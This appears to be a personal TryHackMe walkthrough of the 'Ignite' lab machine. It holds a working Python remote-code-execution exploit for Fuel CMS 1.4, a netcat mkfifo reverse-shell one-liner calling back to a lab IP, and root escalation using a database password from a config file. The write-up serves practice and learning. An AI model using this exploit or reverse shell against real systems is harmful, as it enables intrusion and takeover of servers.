# Ignite Machine Walkthrough
#pentest/tryhackme

## Run nmap and find out some exposed directories, including robots.txt
`robots.txt`

## In robots.txt we see that /fuel exists, which is an CMS
`/fuel`

## We log in with the default password
`admin/admin`

## Find out the version
 `1.4`

## Search in exploit DB for a vulnerability in this version and fetch the exploit
```python
import requests
import urllib

url = "http://10.10.60.210"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
        xxxx = input('cmd:')
        burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.parse.quote(xxxx)+"%27%29%2b%27"
        r = requests.get(burp0_url)

        html = "<!DOCTYPE html>"
        htmlcharset = r.text.find(html)

        begin = r.text[0:20]
        dup = find_nth_overlapping(r.text,begin,2)

        print(r.text[0:dup])
```

## Run the script to get remote execution with the permissions os var-www and create a reverse shell

```sh
# Run this in your local machine
nc -nlvp 1337

# Run this in the python script
rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.8.26.70 1337 >/tmp/f
```

## We now have a raw shell but since it’s not running in a TTY we still cannot get the root flag; we need a full terminal session in order use certain commands such as su, sudo, vi, etc.
To do this we are going to use python to  [launch a second process inside of a TTY](https://pen-testing.sans.org/blog/2017/02/01/pen-test-poster-white-board-python-raw-shell-terminal) .

`python -c 'import pty; pty.spawn("/bin/bash")'`

## After that we can get the user flag:
```bash 
$ whoami
$ cd /home/www-data
$ cat flag.txt
```

## Escalating to root
![](Ignite%20Machine%20Walkthrough/1AB6FE5B-43D6-42F2-A569-5E80D4D286FF.png)

```bash
$ find / -name database.php 2>/dev/null
$ cat /var/www/html/fuel/application/config/database.php

$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',

$ su - root
Password: mememe

$ root@ubuntu:~# ls
root.txt
$ cat root.txt
```

